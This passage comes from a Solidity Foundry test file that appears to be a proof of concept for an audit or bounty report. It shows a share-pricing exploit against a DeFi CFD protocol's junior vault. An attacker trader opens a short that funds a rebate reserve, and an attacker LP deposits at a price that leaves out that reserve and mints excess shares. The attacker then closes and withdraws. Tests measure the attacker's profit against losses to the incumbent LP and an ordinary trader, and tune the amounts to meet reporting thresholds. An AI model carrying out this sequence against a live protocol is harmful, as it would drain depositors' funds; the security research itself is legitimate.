        uint256 marginAssets
    ) external returns (RealizedMeasure memory out) {
        _fundJuniorThroughRouter(DURABLE_LP, DURABLE_CAPITAL);
        _fundTrader(ORDINARY_LONG_TRADER, 500_000e6);
        _fundTrader(ATTACKER_TRADER, traderCapital);
        this.executeAtCurrentTime(ORDINARY_LONG_TRADER, CfdTypes.Side.LONG, LONG_SIZE, 100_000e6, false, 1e8);
        router.updateMarkPrice(_mockPythUpdateData(REALIZED_PRICE));

        Measure memory m;
        uint256 started = vm.getBlockTimestamp();
        uint256 poolBeforeRebate = pool.totalAssets();
        out.preRebatePoolDepth = poolBeforeRebate;
        this.executeAtCurrentTime(ATTACKER_TRADER, CfdTypes.Side.SHORT, shortSize, marginAssets, false, REALIZED_PRICE);
        m.reserve = clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER);
        assertGt(m.reserve, 0);
        assertEq(poolBeforeRebate - pool.totalAssets(), m.reserve);
        (,,,,,, int256 lifetimeVpi) = engine.positions(ATTACKER_TRADER);
        assertEq(m.reserve, uint256(-lifetimeVpi));

        assertEq(juniorVault.maxRequestDeposit(ATTACKER_LP), type(uint256).max);
        settlementToken.mint(ATTACKER_LP, lp);
        vm.startPrank(ATTACKER_LP);
        settlementToken.approve(address(juniorVault), lp);
        uint256 depositId = juniorVault.requestDeposit(lp, ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(depositId));
        uint256 pricingSupply = juniorVault.accruedTotalSupply();
        router.settleLpEpoch(_mockPythUpdateData(REALIZED_PRICE));
        vm.prank(ATTACKER_LP);
        m.actualShares = juniorVault.claimDepositShares(depositId);
        uint256 pricingAssets = pool.juniorPrincipal() - lp;
        out.entryPricingAssets = pricingAssets;
        m.fairShares = juniorVault.quoteDepositFromState(lp, pricingAssets + m.reserve, pricingSupply, 0);
        assertEq(m.actualShares, juniorVault.quoteDepositFromState(lp, pricingAssets, pricingSupply, 0));
        assertLt(m.fairShares, m.actualShares);

        this.executeAtCurrentTime(ATTACKER_TRADER, CfdTypes.Side.SHORT, shortSize, 0, true, REALIZED_PRICE);
        (uint256 remainingShort,,,,,, int256 endingVpi) = engine.positions(ATTACKER_TRADER);
        assertEq(remainingShort, 0);
        assertEq(endingVpi, 0);
        assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER), 0);
        this.executeAtCurrentTime(ORDINARY_LONG_TRADER, CfdTypes.Side.LONG, LONG_SIZE, 0, true, REALIZED_PRICE);
        (uint256 remainingLong,,,,,,) = engine.positions(ORDINARY_LONG_TRADER);
        assertEq(remainingLong, 0);
        out.ordinaryTraderLoss = 500_000e6 - clearinghouse.balanceAssets(ORDINARY_LONG_TRADER);

        uint256 incumbentShares = juniorVault.balanceOf(DURABLE_LP);
        out.incumbentShares = incumbentShares;
        out.postCloseJuniorAssets = juniorVault.totalAssets();
        m.incumbentActualClaim = juniorVault.convertToAssets(incumbentShares);
        uint256 fairSupply = juniorVault.accruedTotalSupply() - m.actualShares + m.fairShares;
        m.incumbentFairClaim = Math.mulDiv(incumbentShares, juniorVault.totalAssets() + 1, fairSupply + 1000);
        m.incumbentClaimLoss = m.incumbentFairClaim - m.incumbentActualClaim;
        uint256 contributed = DURABLE_CAPITAL + 1000e6;
        out.incumbentPrincipalLoss = contributed > m.incumbentActualClaim ? contributed - m.incumbentActualClaim : 0;

        vm.warp(vm.getBlockTimestamp() + 1 hours);
        vm.prank(ATTACKER_LP);
        uint256 redeemId = juniorVault.requestRedeem(m.actualShares, ATTACKER_LP, ATTACKER_LP);
        vm.warp(juniorVault.depositEpochStart(redeemId));
        router.settleLpEpoch(_mockPythUpdateData(REALIZED_PRICE));
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, ATTACKER_LP);
        assertEq(claimable, m.actualShares);
        vm.prank(ATTACKER_LP);
        m.lpProceeds = juniorVault.claimRedeem(redeemId, claimable, ATTACKER_LP, ATTACKER_LP);
        uint256 traderBalance = clearinghouse.balanceAssets(ATTACKER_TRADER);
        vm.prank(ATTACKER_TRADER);
        clearinghouse.withdrawMargin(traderBalance);
        m.traderProceeds = settlementToken.balanceOf(ATTACKER_TRADER);
        m.traderExpense = int256(traderCapital) - int256(m.traderProceeds);
        m.netGain = int256(settlementToken.balanceOf(ATTACKER_LP) + m.traderProceeds) - int256(lp + traderCapital);
        m.lpDeposit = lp;
        m.existingLongSize = LONG_SIZE;
        m.positionSize = shortSize;
        m.traderCapital = traderCapital;
        m.peakCapital = lp + traderCapital;
        m.elapsedSeconds = vm.getBlockTimestamp() - started;
        assertEq(juniorVault.balanceOf(ATTACKER_LP), 0);
        assertEq(clearinghouse.balanceAssets(ATTACKER_TRADER), 0);
        out.cycle = m;
    }

    function _meetsReport(
        RealizedMeasure memory m
    ) internal pure returns (bool) {
        return m.cycle.netGain >= int256(REPORT_GAIN) && m.cycle.incumbentClaimLoss >= REPORT_CLAIM_LOSS
            && m.incumbentPrincipalLoss >= REPORT_PRINCIPAL_LOSS;
    }

    function _logCycle(
        RealizedMeasure memory m
    ) internal {
        emit log_named_uint("LP deposit atoms", m.cycle.lpDeposit);
        emit log_named_uint("SHORT size 18 decimals", m.cycle.positionSize);
        emit log_named_uint("trader capital atoms", m.cycle.traderCapital);
        emit log_named_uint("peak capital atoms", m.cycle.peakCapital);
        emit log_named_uint("funded reserve atoms", m.cycle.reserve);
        emit log_named_uint("incumbent actual claim atoms", m.cycle.incumbentActualClaim);
        emit log_named_uint("incumbent fair claim atoms", m.cycle.incumbentFairClaim);
        emit log_named_uint("incumbent same-state claim loss atoms", m.cycle.incumbentClaimLoss);
        emit log_named_uint("incumbent principal loss atoms", m.incumbentPrincipalLoss);
        emit log_named_uint("ordinary trader loss atoms", m.ordinaryTraderLoss);
        emit log_named_uint("LP redemption proceeds atoms", m.cycle.lpProceeds);
        emit log_named_uint("trader withdrawal atoms", m.cycle.traderProceeds);
        emit log_named_int("unrecoverable trading expense atoms", m.cycle.traderExpense);
        emit log_named_int("net attacker gain atoms", m.cycle.netGain);
        emit log_named_uint("capital commitment seconds", m.cycle.elapsedSeconds);
    }

    function test_OneCycleReportBenchmark() public {
        RealizedMeasure memory m = this.measureRealizedFresh(30_000_000e6, LONG_SIZE, 500_000e6, 100_000e6);
        assertEq(m.cycle.reserve, 3_117_155_777);
        assertEq(m.cycle.netGain, int256(REPORT_GAIN));
        assertEq(m.cycle.incumbentClaimLoss, REPORT_CLAIM_LOSS);
        assertEq(m.incumbentPrincipalLoss, REPORT_PRINCIPAL_LOSS);
        assertEq(m.cycle.elapsedSeconds, 10_798);
        _logCycle(m);
    }

    function test_OneCycleMinimumCandidate() public {
        RealizedMeasure memory m =
            this.measureRealizedFresh(CANDIDATE_LP, CANDIDATE_SHORT, CANDIDATE_TRADER, CANDIDATE_PLEDGE);
        assertTrue(_meetsReport(m));
        assertEq(m.cycle.peakCapital, 30_011_774_931_898);
        assertEq(m.cycle.netGain, 342_273_713);
        assertEq(m.cycle.incumbentClaimLoss, 2_338_018_061);
        assertEq(m.incumbentPrincipalLoss, REPORT_PRINCIPAL_LOSS);
        assertEq(m.cycle.elapsedSeconds, 10_798);
        _logCycle(m);
    }

    /// @notice One complete cycle with independently supplied attacker amounts.
    /// Run separate invocations to compare candidates; this method never loops.
    function test_OneCycleConfigured() public {
        uint256 lp = vm.envOr("VPI_LP", uint256(CANDIDATE_LP));
        uint256 shortSize = vm.envOr("VPI_SIZE", uint256(CANDIDATE_SHORT));
        uint256 traderCapital = vm.envOr("VPI_TRADER", uint256(CANDIDATE_TRADER));
        uint256 pledge = vm.envOr("VPI_PLEDGE", uint256(CANDIDATE_PLEDGE));
        RealizedMeasure memory m = this.measureRealizedFresh(lp, shortSize, traderCapital, pledge);
        _logCycle(m);
        assertTrue(_meetsReport(m), "one-cycle result misses a report outcome");
    }

    function test_OneCycleOneAtomLessLpMissesReportOutcome() public {
        RealizedMeasure memory m =
            this.measureRealizedFresh(CANDIDATE_LP - 1, CANDIDATE_SHORT, CANDIDATE_TRADER, CANDIDATE_PLEDGE);
        _logCycle(m);
        assertFalse(_meetsReport(m));
    }

    function test_OneCycleOneAtomLessTraderFundingFailsPublicPath() public {
        try this.measureRealizedFresh(CANDIDATE_LP, CANDIDATE_SHORT, CANDIDATE_TRADER - 1, CANDIDATE_PLEDGE) {
            fail("one atom less trader funding unexpectedly completed");
        } catch {}
    }

    function test_OneCycleOneAtomLessPledgeFailsPublicPath() public {
        try this.measureRealizedFresh(CANDIDATE_LP, CANDIDATE_SHORT, CANDIDATE_TRADER, CANDIDATE_PLEDGE - 1) {
            fail("one atom less position pledge unexpectedly completed");
        } catch {}
    }

    function test_OneCycleSmallerShortImprovesGainButLowersVictimLoss() public {
        RealizedMeasure memory m = this.measureRealizedFresh(30_000_000e6, 1_500_000e18, 500_000e6, 60_000e6);
        _logCycle(m);
        assertGt(m.cycle.netGain, int256(REPORT_GAIN));
        assertLt(m.cycle.incumbentClaimLoss, REPORT_CLAIM_LOSS);
    }

    function test_OneCycleLargerLpIncreasesGainAndVictimLoss() public {
        RealizedMeasure memory m = this.measureRealizedFresh(60_000_000e6, LONG_SIZE, 500_000e6, 100_000e6);
        _logCycle(m);
        assertGt(m.cycle.netGain, int256(REPORT_GAIN));
        assertGt(m.cycle.incumbentClaimLoss, REPORT_CLAIM_LOSS);
        assertGt(m.incumbentPrincipalLoss, REPORT_PRINCIPAL_LOSS);
        assertEq(m.cycle.elapsedSeconds, 10_798);
    }

}
```
